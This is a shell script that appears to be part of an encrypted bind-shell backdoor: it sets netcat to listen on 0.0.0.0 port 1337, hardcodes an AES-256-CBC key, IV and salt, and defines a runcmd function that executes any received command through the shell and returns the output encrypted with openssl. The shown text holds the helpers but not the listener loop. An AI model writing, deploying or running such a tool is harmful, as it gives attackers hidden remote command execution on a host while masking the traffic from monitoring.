#!/bin/sh

# common variables
# You can explicitly define all of the variables
# Just set them in env-var
# You can simply pass them right before actual command
# eg. NC="./mynetcat" <scriptname>
# BIND_HOST is the ip address to bind to
# BIND_PORT is the port to bind to, choose above 1000 for non-root
# NC is path to netcat; if not set, tries to find system netcat
# OPENSSL is path to openssl binary; if not set, tries to find system openssl
# SHELL is path to the default shell; if not set, uses /bin/bash
# In most cases, SHELL is already set

BIND_HOST="${BIND_HOST:-0.0.0.0}"
BIND_PORT="${BIND_PORT:-1337}"
NC="${NC:-$(which nc)}"
OPENSSL="${OPENSSL:-$(which openssl)}"
SHELL="${SHELL:-/bin/bash}"

#crypto keys
#generate via cmd: openssl enc -aes-256-cbc -k secret -P -md sha1
KEY="${KEY:-13CEEDF8BD74BE6900E4A591621B37622B16BB563CF92BFB168416D342990F28}"
IV="${IV:-644227EB3C302982B12006A27F8C7717}"
SALT="${SALT:-0538FC5E338ED0FF}"

encrypt() {
    # encode all args, quoted single arg is recommended though
    echo "$*" | "${OPENSSL}" enc -S "$SALT" -a -K "${KEY}" -iv "${IV}" -aes-256-cbc
}

decrypt() {
    echo "$*" | "${OPENSSL}" enc -d -a -S "${SALT}" -K "${KEY}" -iv "${IV}" -aes-256-cbc
}

runcmd() {
     # runs whatever command is passed
     cmdoutput=$("${SHELL}" -c "$*" 2>&1)
     encrypt "${cmdoutput}"
}

stdinencrypt() {
    [ $# -ge 1 -a -f "$1"   ] && input="$1" || input="-"
    encrypt $(cat "${input}")
}

stdindecrypt() {
    [ $# -ge 1 -a -f "$1"   ] && input="$1" || input="-"
    decrypt $(cat "${input}")
}

quit() {
    echo "Exiting..."
    exit 0
}
